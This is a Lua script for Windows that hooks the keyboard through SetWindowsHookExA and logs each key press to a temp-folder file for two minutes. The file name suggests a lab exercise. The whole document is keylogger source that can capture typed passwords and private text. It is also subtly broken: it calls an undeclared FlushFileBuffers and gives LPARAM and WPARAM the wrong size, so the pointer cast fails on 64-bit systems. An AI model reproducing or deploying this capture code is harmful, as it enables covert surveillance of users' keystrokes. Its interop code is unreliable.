-- keyboard_capture.lua
-- Captures keystrokes using SetWindowsHookEx and logs them to a temporary file

local ffi = require("ffi")
local bit = require("bit")

-- Disable JIT for stability
local jit = require("jit")
jit.off(true, true)

ffi.cdef[[
typedef unsigned long DWORD;
typedef unsigned short WORD;
typedef unsigned char BYTE;
typedef int BOOL;
typedef void* HANDLE;
typedef void* HHOOK;
typedef void* HWND;
typedef void* HINSTANCE;
typedef void* LPVOID;
typedef const char* LPCSTR;
typedef long LONG;
typedef LONG LRESULT;
typedef DWORD WPARAM;
typedef LONG LPARAM;
typedef uintptr_t ULONG_PTR;

typedef struct {
    DWORD vkCode;
    DWORD scanCode;
    DWORD flags;
    DWORD time;
    ULONG_PTR dwExtraInfo;
} KBDLLHOOKSTRUCT;

HHOOK SetWindowsHookExA(int idHook, LPVOID lpfn, HINSTANCE hMod, DWORD dwThreadId);
BOOL UnhookWindowsHookEx(HHOOK hhk);
LRESULT CallNextHookEx(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
int GetMessageA(void* lpMsg, HWND hWnd, DWORD wMsgFilterMin, DWORD wMsgFilterMax);
DWORD GetTempPathA(DWORD, char*);
HANDLE CreateFileA(const char*, DWORD, DWORD, void*, DWORD, DWORD, HANDLE);
BOOL WriteFile(HANDLE, const char*, DWORD, DWORD*, void*);
BOOL CloseHandle(HANDLE);
]]

local user32 = ffi.load("user32")
local kernel32 = ffi.load("kernel32")

-- Constants
local WH_KEYBOARD_LL = 13
local WM_KEYDOWN = 0x0100
local GENERIC_WRITE = 0x40000000
local CREATE_ALWAYS = 2
local FILE_ATTRIBUTE_NORMAL = 0x80
local INVALID_HANDLE_VALUE = ffi.cast("HANDLE", ffi.cast("intptr_t", -1))

-- Global variables
local logFileHandle = nil
local hook = nil

-- Logging functions
local function getTempPath()
    local buffer = ffi.new("char[260]")
    local len = kernel32.GetTempPathA(260, buffer)
    if len > 0 then
        return ffi.string(buffer, len)
    end
    return "C:\\Temp\\"
end

local function initializeLogFile()
    local tempPath = getTempPath()
    local timestamp = os.date("%Y%m%d_%H%M%S")
    local logPath = string.format("%sWIN11LAB_KEYBOARD_CAPTURE_%s.log", tempPath, timestamp)

    logFileHandle = kernel32.CreateFileA(
        logPath,
        GENERIC_WRITE,
        0,
        nil,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nil
    )

    if logFileHandle == INVALID_HANDLE_VALUE then
        logFileHandle = nil
        print("[!] Failed to create log file")
    else
        print(string.format("[+] Log file created: %s", logPath))
    end
end

local function logKeystroke(key)
    if logFileHandle ~= nil then
        local logLine = string.format("%s\n", key)
        local written = ffi.new("DWORD[1]")
        kernel32.WriteFile(logFileHandle, logLine, #logLine, written, nil)
        kernel32.FlushFileBuffers(logFileHandle)  -- Ensure log is flushed immediately
    end
end

local function closeLogFile()
    if logFileHandle ~= nil then
        kernel32.CloseHandle(logFileHandle)
        logFileHandle = nil
    end
end

-- Keyboard hook callback
local function keyboardHook(nCode, wParam, lParam)
    if nCode >= 0 and wParam == WM_KEYDOWN then
        if lParam == nil then
            logKeystroke("[!] Invalid lParam received in keyboardHook")
            return user32.CallNextHookEx(hook, nCode, wParam, lParam)
        end

        local kbdStruct = ffi.cast("KBDLLHOOKSTRUCT*", lParam)
        local vkCode = kbdStruct.vkCode
        logKeystroke(string.format("Key: %d (Virtual Key Code)", vkCode))  -- Log detailed keypress information
    end
    return user32.CallNextHookEx(hook, nCode, wParam, lParam)
end

jit.off(keyboardHook, true)  -- Disable JIT for the callback function

-- Main execution
local function main()
    initializeLogFile()

    local hookCallback = ffi.cast("LRESULT (__stdcall *)(int, WPARAM, LPARAM)", keyboardHook)
    hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, hookCallback, nil, 0)

    if hook == nil then
        print("[!] Failed to set keyboard hook")
        return
    end

    _G.hookCallback = hookCallback  -- Store the callback globally to prevent garbage collection

    print("[+] Keyboard hook set. Capturing keystrokes...")

    local msg = ffi.new("char[256]")
    local startTime = os.time()
    while os.difftime(os.time(), startTime) < 120 do  -- Run for 2 minutes
        user32.GetMessageA(msg, nil, 0, 0)
    end

    user32.UnhookWindowsHookEx(hook)
    hookCallback:free()
    closeLogFile()
end

main()